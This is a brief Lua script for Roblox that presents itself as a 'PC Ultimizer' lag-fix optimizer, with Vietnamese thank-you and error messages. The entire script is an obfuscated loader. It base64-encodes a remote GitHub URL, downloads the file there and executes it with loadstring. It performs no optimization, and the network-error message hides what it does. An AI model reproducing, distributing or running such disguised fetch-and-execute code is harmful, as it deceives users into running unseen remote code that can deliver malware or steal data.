-- [[ PC ULTIMIZER ENCRYPTED LOADER ]]
-- Cảm ơn bạn đã sử dụng tối ưu fix lag! Chúc bạn có một trải nghiệm tốt nhé

local _0x7768 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RhbXRpZW4xMjQvbG9hZGVyLmx1YS9yZWZzL2hlYWRzL21haW4vUkVBRE1FLm1k"

local function _decode(_data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    _data = string.gsub(_data, '[^'..b..'=]', '')
    return (_data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local _success, _error = pcall(function()
    loadstring(game:HttpGet(_decode(_0x7768)))()
end)

if not _success then
    warn("Giao diện tải thất bại, vui lòng kiểm tra kết nối mạng.")
end
